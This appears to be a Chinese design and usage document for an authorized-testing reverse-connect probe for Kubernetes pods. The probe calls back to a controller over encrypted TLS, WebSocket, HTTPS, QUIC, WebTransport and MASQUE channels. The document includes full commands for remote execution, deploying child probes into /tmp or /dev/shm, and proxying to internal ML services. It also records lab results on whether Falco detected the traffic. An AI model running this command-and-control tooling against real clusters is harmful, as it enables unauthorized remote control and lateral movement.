# 探针主动回连通道（Reverse Channel）

> 仅用于已获授权的测试环境。探针只在授权范围内运行，不提供未授权访问能力。
>
> 默认前提是普通/最低权限 Pod：非 root、无 hostPath、无 privileged、无
> kubeconfig、无 ServiceAccount token，仅允许出站 TCP。控制器不向目标 Pod
> 开放监听端口。

## 1. 传输选择

| 传输 | 形态 | 状态 |
|---|---|---|
| `tls` | TLS 内承载 4-byte length + JSON framed 协议（默认） | 已实现；Python 控制端与 Rust 探针均实测 |
| `wss` | TLS + RFC 6455 WebSocket，二进制消息承载 framed 字节流 | 已实现；Python 控制端与 Rust 探针均实测 |
| `https` | TLS + HTTP/1.1 长轮询：`POST /v1/probe/poll`、`POST /v1/probe/result` | 已实现；Python 控制端与 Rust 探针均实测 |
| `quic` | QUIC/TLS 1.3 + 双向流承载同一 framed 协议（ALPN `inkblade-reverse/1`） | 实验性 UDP；Rust `quinn` 探针与 aioquic 控制端实测 |
| `webtransport` | HTTP/3 extended CONNECT（`:protocol=webtransport`）+ 每探针一条 bidi stream | 实验性 UDP；aioquic 控制端 + aioquic 测试客户端实测 handshake/collect/exec；Rust 探针 WebTransport 客户端未实现 |
| `masque` | RFC 9298 CONNECT-UDP（`:protocol=connect-udp`）+ HTTP Datagrams | 实验性 UDP；aioquic 控制端、aioquic 客户端、探针 `udp` 中转均实测 |

**没有公开明文传输。** `--transport tcp` 不属于产品选项；仅在进程内测试
中使用 `--lab-plaintext`，且必须设置 `INKBLADE_ALLOW_PLAINTEXT_LAB=1`。
CLI 输出会标注 `PLAINTEXT LAB`，不得用于真实目标。

QUIC、WebTransport、MASQUE 都走 UDP，控制端默认在同一 TCP 端口额外监听
加密 TLS 回退（`--fallback tls`）。探针遇到 UDP 不可达时明确报
`udp-blocked`，然后改走 TLS/WSS，探针记录里出现 `fallback: true` 和
`fallback_from: "quic"`；不会静默伪装成 QUIC 成功。

HTTP/2 **仍未实现**：`https` 是 HTTP/1.1 长轮询。WebTransport 使用 HTTP/3；
MASQUE 使用 HTTP/3 extended CONNECT + HTTP Datagrams。WSS/HTTPS/QUIC/
WebTransport 的命令分发与 TLS 完全相同，均复用
`inkblade.channel.ProbeConnection` 的 request/collect/exec/upload/spawn/
dial/socks/udp/cleanup 实现。

## 2. TLS、CA 与证书 pin

控制器首次启动时在
`<home>/evidence/<workspace>/reverse/tls/` 生成：

- `ca.pem`：CA 证书；
- `server.pem` / `server-key.pem`：服务器叶证书与私钥；
- `server.sha256`：叶证书 DER 的 SHA-256 pin。

也可以显式提供 `--tls-ca`、`--tls-cert`、`--tls-key`。私钥权限为 `0600`。

探针必须同时提供 CA 与 pin：

```sh
./inkblade-probe reverse \
  --transport tls \
  --host controller.example \
  --port 9443 \
  --ca-file ca.pem \
  --pin <server.sha256 内容> \
  --sni controller.example \
  --token-file /tmp/.inkblade-probe-token \
  --probe-id pod-a --read-only
```

校验顺序：rustls 先验证证书链、有效期、主机名/SNI，再对叶证书 DER 做
SHA-256 pin 比对；TLS 内再执行 challenge-HMAC-SHA256 token 认证。错误 pin、
错误 token、过期证书都会被拒绝。`--sni` 用于证书 SAN 与主机名不一致的
场景（例如按 Service DNS 名签发、按 Pod IP 连接）。

`quic`/`webtransport`/`masque` 使用同一 CA 与叶证书。Rust `quinn` 探针在
QUIC 握手内复用同一个 rustls 自定义 verifier 做链校验+叶证书 pin；aioquic
测试客户端在握手后比较叶证书 DER SHA-256。TLS 1.3 是 QUIC 的强制最低版本。

MASQUE 的 CONNECT-UDP 请求额外带
`x-inkblade-nonce`、`x-inkblade-timestamp`、`x-inkblade-mac` 头；MAC 是
共享 token 对 `inkblade-masque/v1|nonce|timestamp|path` 的 HMAC-SHA256，
时间窗 120 秒。请求也携带 `capsule-protocol: ?1`；控制端校验通过后才建立
UDP 中转。原始 token 不放在 URL 或日志里。

token 文件应为 `0600`，控制器会拒绝权限过宽的 token 文件（POSIX）。token
不写入 `probes.json`、控制口文件、审计输出或日志；`channel listen` 的
JSON 只输出 CA 路径和 pin，不输出 token。

## 3. 控制器监听与多探针

```sh
inkblade channel listen \
  --bind 0.0.0.0 --port 9443 \
  --transport tls \
  --token-file ./probe.token \
  --workspace local-lab \
  --max-probes 64 \
  --ping-interval 15 \
  --idle-timeout 60
```

- 每个连接独立线程/锁；认证成功后按 `probe_id` 注册。
- 重复 `probe_id` 采用**替换**策略：新连接生效，旧连接被关闭，记录
  `replaced: true`；状态文件只保留一行。
- `--max-probes` 限制唯一在线探针数；超限连接被关闭。
- `--max-pending` 限制单连接未完成 RPC 数，避免慢探针拖垮控制器。
- 状态写入 `<home>/evidence/<workspace>/reverse/probes.json`，字段包括
  `probe_id`、`parent_id`、`remote`、`transport`、`read_only`、`caps`、
  `last_seen`、`status`、`connected_at`；同时写入 SQLite 探针注册表，
  因此 `inkblade probe list` 和 UI 能看到回连探针。
- 控制口绑定 `127.0.0.1` 随机端口，随机 token 写入同目录 `control.json`
  （`0600`）。另一进程可用 `inkblade channel exec` 对已回连探针执行命令。

QUIC 控制器（UDP；同一 TCP 端口自动开 TLS 回退）：

```sh
inkblade channel listen \
  --bind 0.0.0.0 --port 9443 \
  --transport quic \
  --fallback tls \
  --token-file ./probe.token \
  --workspace local-lab \
  --max-probes 64
```

探针：

```sh
./inkblade-probe reverse \
  --transport quic \
  --host controller.example --port 9443 \
  --ca-file ca.pem --pin <server.sha256 内容> \
  --sni controller.example \
  --token-file /tmp/.inkblade-probe-token \
  --fallback tls \
  --probe-id pod-a --read-only
```

WebTransport 是实验性 HTTP/3 传输，握手后仍走同一 framed 认证与 RPC：

```sh
inkblade channel listen --transport webtransport \
  --webtransport-path /inkblade/wt \
  --fallback tls --port 9443 --token-file ./probe.token
```

MASQUE CONNECT-UDP 面向 RoCE/UCX 的 **UDP 辅助面**，不是 RDMA verbs：

```sh
inkblade channel listen --transport masque \
  --masque-path /.well-known/masque/udp \
  --fallback tls --port 9443 --token-file ./probe.token
```

客户端对目标发 CONNECT-UDP，例如
`https://controller:9443/.well-known/masque/udp/10.0.0.12/4791/`。控制端通过
已认证反向探针的 `udp` op 执行 `bind`/`send`/`recv`/`close`，把 UDP 数据报
转成 HTTP Datagrams。探针只绑定临时的非特权 UDP 端口（>1024），不监听
目标 Pod 的开放端口。多个在线探针时必须带 `x-inkblade-probe` 头指定
`probe_id`。

子探针由父探针上传并启动，回连后带 `parent_id` 注册：

```sh
inkblade probe deploy --reverse <parent_probe_id> \
  --binary ./inkblade-probe \
  --transport tls \
  --reverse-host controller.example --reverse-port 9443 \
  --ca-file ca.pem --pin <pin> --sni controller.example \
  --allow-write --workspace local-lab
```

上传优先 `/tmp`，失败回退 `/dev/shm`；两者都不可写（只读根文件系统且无
可写 emptyDir）时返回 `read_only_rootfs`，不会假装子探针已部署。父探针
保留子进程句柄和 `parent_id` 关系；控制器通过子探针自己的回连 socket
直接下发命令。

## 4. 长连接、心跳与重连

- 控制器默认每 15s 发 `ping`，60s 无活动（包括 ping 失败）则关闭并标记
  `offline`；`--ping-interval 0`/`--idle-timeout 0` 可关闭。
- QUIC 探针设置 15s QUIC keep-alive、60s idle timeout；控制端 aioquic
  idle timeout 至少 120s（或不低于 `--idle-timeout` 的两倍）。服务端心跳、
  多探针上限、重复 `probe_id` 替换、状态文件与 `tls`/`wss`/`https` 相同。
- 探针断线后按指数退避重连：1s、2s、4s……上限 60s，并加入抖动；
  重连后重新做 TLS/QUIC 与 token 认证。`--no-reconnect` 只连接一次，
  `--max-retries N` 限制重试次数（0 表示不限制）。
- QUIC 首次 UDP 握手超时（默认 `--connect-timeout-ms 10000`）时输出
  `udp-blocked`；命令行给了 `--fallback tls|wss`（`quic` 默认 `tls`）时，
  探针在同一个 TCP 端口改走加密回退，并输出
  `udp-blocked on quic; falling back to tls`。控制端探测记录中
  `fallback: true`、`fallback_from: "quic"`，审计事件
  `reverse.fallback`。`--fallback none` 禁止回退。
- 控制器关闭时清理线程、socket、session 队列和探针句柄；`SIGINT`/
  `SIGTERM` 走同一清理路径。
- pending 请求、事件、stderr 尾、HTTP 长轮询 outbox、MASQUE UDP 队列都有
  上界，不随连接时长无限增长。

## 5. 快速验证

一次性接收一个探针并执行 `collect`（适合自动化/CI）：

```sh
inkblade channel listen --once --exec collect \
  --bind 127.0.0.1 --port 9443 \
  --transport tls --tls-dir ./reverse-tls \
  --token-file ./probe.token --json
```

输出包含 `probe.probe_id`、`probe.remote`、`probe.transport`、
`probe.read_only`、`probe.caps` 和 `result`。退出码：认证/接收失败 2，
连接后动作失败 1，成功 0。

长驻模式：

```sh
inkblade channel listen --transport wss --wss-path /ws ...
inkblade channel listen --transport https --poll-path /v1/probe/poll ...
inkblade channel listen --transport quic --fallback tls ...
inkblade channel listen --transport webtransport --fallback tls ...
inkblade channel listen --transport masque --fallback tls ...
inkblade probe list --workspace local-lab
inkblade channel exec --workspace local-lab --probe-id pod-a --op ping --json
```

本地自动验证（aioquic + fake probe；Rust 探针测试需要已编译二进制）：

```sh
python -m unittest tests.test_probe_quic -v
python -m unittest tests.test_probe_reverse -v
```

`tests.test_probe_quic` 覆盖 QUIC/WebTransport/MASQUE 握手、collect/exec、
错误 pin/token、20 探针并发、心跳/重连、TLS fallback 标记，以及 Rust
探针的 QUIC/UDP/`udp-blocked` 回退。

## 6. 本地防护实验与边界

`tests/reverse_defense_lab.py` 在 QEMU k3s 实验环境中创建普通低权限 Pod
（`runAsUser=65532`、`runAsNonRoot=true`、`readOnlyRootFilesystem=true`、
`privileged=false`、`allowPrivilegeEscalation=false`、
`automountServiceAccountToken=false`、无 hostPath），由 Pod 主动回连
另一个集群内控制器 Pod，三种传输分别执行 connect / collect / exec /
上传子探针回连。2026-10-27 实测摘要（完整 JSON 由脚本输出）：

| 项 | 结果 |
|---|---|
| TLS 回连 + collect + exec + 子探针 parent_id | 通过 |
| WSS 回连 + collect + exec + 子探针 parent_id | 通过 |
| HTTPS 长轮询 + collect + exec + 子探针 parent_id | 通过 |
| QUIC / WebTransport / MASQUE 低权限 Pod | 本环境未重跑（需要 k3s/QEMU 集群）；本地 loopback 端到端通过，不作为集群实测声明 |
| Falco 0.45.1 对三种反向通道流量 | `not-observed`（无对应规则命中） |
| Falco 对 existing-binary（`/bin/echo`） | `not-observed` |
| Falco 对 `/tmp` 复制二进制执行 | `not-observed`（本实验规则集；不等于通用绕过） |
| Falco 对 memfd 执行 | `detected`（`Fileless execution via memfd_create`） |
| Kyverno 1.19.2 | `not-applicable`（准入时只看到 Pod 对象，不看运行时回连流量） |
| WAF / ModSecurity | `not-applicable`（本实验没有 WAF 位于 Pod 出站路径） |

结论边界：

- 反向通道本身（TLS/WSS/HTTPS）未触发本次部署的 Falco 规则，属于
  `not-observed`，**不承诺对所有安全设备不可检测**；网络流量、eBPF、CNI、
  DNS、TLS 指纹或企业代理仍可能识别。
- QUIC/WebTransport/MASQUE 是 UDP 面；UDP 被阻断时可能不可用。本实验没有
  重跑这三个传输的 Falco/CNI 观测，不能把 TLS/WSS/HTTPS 的
  `not-observed` 结论外推到 UDP。
- memfd 在本规则集下被检测；不能把“未告警”写成“通用绕过”。
- Kyverno 是准入控制；它不会因为运行时的反向通道而告警，但会拦截
  privileged/hostPath 等 Pod 规格。
- WAF 只有在流量经过它时才可能检测；本实验没有这一跳。
- 未实现 HTTP/2、域名前置、CDN 或真实公网 TLS 指纹伪装。QUIC/
  WebTransport/MASQUE 已实现但属于实验性传输，不承诺所有中间网络放行。

## 7. 低权限前提

- Pod 以非 root 运行，根文件系统只读，`/tmp` 或 `/dev/shm` 是可写
  emptyDir/tmpfs；没有 hostPath、privileged、额外 capability。
- 不需要 kubeconfig、ServiceAccount token、host PID/network 或 root。
- 只需要到控制器的出站 TCP（以及 DNS，如果使用域名）。QUIC/WebTransport/
  MASQUE 需要到控制器的出站 UDP；UDP 不通时使用 TLS/WSS 回退。
- MASQUE 的探针侧 UDP 绑定只使用临时非特权端口（>1024），不要求 root、
  CAP_NET_RAW、hostNetwork、hostPath 或 privileged。它是 UDP 辅助面，
  **不冒充 RDMA verbs / RoCE 数据面**。
- 子探针写入 `/tmp` 或 `/dev/shm`；两者都不可写时明确失败，不回退到
  宿主机路径。

## 8. ML 原生代理协议

本地 SOCKS5 只是兼容层，绝不作为跨集群代理。ML 原生代理按协议顺序推进：

| 优先级 | 协议 | 状态 |
|---|---|---|
| P1 | gRPC over TLS（Triton 8001 / Ray 8265），bidi stream，token 在 metadata | 已实现，`--protocol grpc` |
| P2 | Redis RESP over TLS（Ray GCS 6379），客户端 `AUTH <token>` | 已实现，`--protocol redis` |
| P3 | ZMTP + CURVE（SGLang/vLLM） | 已实现，`--protocol zmtp`；本地 CURVE 终止 + probe bridge，真实 SGLang/vLLM 未接 |
| P4 | TCPStore/Gloo TLS relay（PyTorch 29500），HMAC preamble | 已实现，`--protocol tcpstore` |
| P5 | MASQUE CONNECT-UDP（RoCE/UCX 辅助面） | 已实现，`channel listen --transport masque` + probe `udp`；不冒充 RDMA verbs |
| P6 | NCCL/UCX TCP 控制流 profile（端口映射/保活/抖动） | 已实现，`--protocol nccl\|ucx`；不冒充 RDMA verbs |

P1 需要可选依赖 `h2`（`pip install h2`）。P1/P2/P3/P4/P6 的本地客户端侧是
TLS，控制器到探针的数据面走已认证加密的 reverse 传输（`tls`/`wss`/
`https`/`quic`/`webtransport`）；目标侧是探针 `dial` 的 TCP 连接，不在本层
终止目标 TLS。token 文件 `0600`，不写入状态或日志。P6 只统计 TCP 控制流
端口、保活 RTT 与抖动，不实现 IB/RoCE/UCX/NCCL 数据面。P5 是独立的
MASQUE CONNECT-UDP 监听器，使用探针 `udp` op 中转 UDP 数据报；它同样
不实现 IB/RoCE verbs，也不声称替代 RDMA 数据面。

P3 实现：本地 `zmq.ROUTER` 绑定 `127.0.0.1` 并启用 `curve_server`，token
经 SHA-256 派生本地客户端 CURVE 密钥；默认用 ZAP 目录 allowlist 只允许该
客户端公钥（`--allow-any-client` 可显式放宽）。本地 ROUTER 与 `zmq.DEALER`
经 loopback TCP bridge 连接，bridge 再通过 `ProbeConnection.dial` 连目标并
原样双向转发字节；DEALER 自己重新发起标准 ZMTP/CURVE 握手。目标若为 REP，
REP 需要空分隔符，代理在 ROUTER/DEALER 之间做最小的 identity/空分隔符
适配（FIFO），不是解密后重建业务 payload。`--target-public-key` 指定目标
CURVE 公钥，`NULL` 表示目标无 CURVE。pyzmq 是 P3 的可选依赖
（`pip install pyzmq`）。本次测试目标是 fake pyzmq CURVE REP，真实
SGLang/vLLM 未接；不声称通用绕过。


## 9. Rust 构建与验证

```sh
cd probe
cargo check
cargo build --release
```

本地开发验证：Windows GNU 工具链 `cargo check` 通过；构建的 debug/release
探针在 Windows 上实测了 `tls`、`wss`、`https`、`quic` 四种传输的
collect/exec，`spawn --reverse` 子探针回连和 `parent_id` 注册，以及
`udp` op 的 bind/send/recv/close。QUIC 回退实测：把 UDP 指向无监听端口、
TCP 指向 TLS 控制端，探针输出 `udp-blocked ... falling back to tls`，
控制端记录 `transport=tls`、`fallback=true`、`fallback_from=quic`。

WebTransport 的 Rust 探针客户端**未实现**（quinn 只做 raw QUIC）；控制端
WebTransport 与 aioquic 测试客户端已实测 handshake/collect/exec。不要把它
描述成 Rust 探针已验证 WebTransport。

Linux musl 静态二进制由 `.github/workflows/probe-release.yml` 构建，
CI 运行 `tests.test_probe_rust_dynamic`、`tests.test_probe_reverse`、
`tests.test_probe_reverse_rust` 和 `tests.test_probe_quic`；本地未运行
musl 二进制。

## 10. 2026-10-27 实测结果

本机 Windows + Python 3.12 + aioquic 1.7.0 + Rust 1.99.1（GNU）实测：

| 项 | 结果 |
|---|---|
| QUIC 控制端 + Rust quinn 探针：握手/collect/exec | 通过 |
| QUIC 控制端 + aioquic fake：collect/exec、错误 pin、错误 token | 通过（错误连接被拒绝） |
| QUIC 20 探针并发 | 通过（20/20 online，collect 正常） |
| QUIC 心跳 last_seen / 断线 offline / 同 probe_id 重连替换 | 通过 |
| QUIC UDP 阻断 -> TLS 回退 | 通过（`udp-blocked`，`fallback=true`） |
| WebTransport 控制端 + aioquic 客户端：handshake/collect/exec | 通过（experimental） |
| WebTransport 错误 path / 错误 token | 拒绝，未注册 |
| WebTransport Rust 探针客户端 | 未实现，未验证 |
| MASQUE CONNECT-UDP + HTTP Datagrams + 探针 udp 中转 | 通过（UDP echo 往返） |
| MASQUE 错误 token | 拒绝（401），未建立 relay |
| Rust 探针 udp bind/send/recv/close | 通过 |
| `cargo check` / `cargo build`（Windows GNU，debug + release） | 通过 |
| 低权限 Pod 上的 QUIC/WebTransport/MASQUE | 未重跑（需要集群）；本地 loopback 通过，不冒充集群实测 |

说明：aioquic 测试客户端在握手后校验叶证书 pin；Rust quinn 探针在 TLS
握手中通过自定义 verifier 校验链并比对 pin。MASQUE 的认证是 token HMAC
请求头，不是把原始 token 放进 URL。
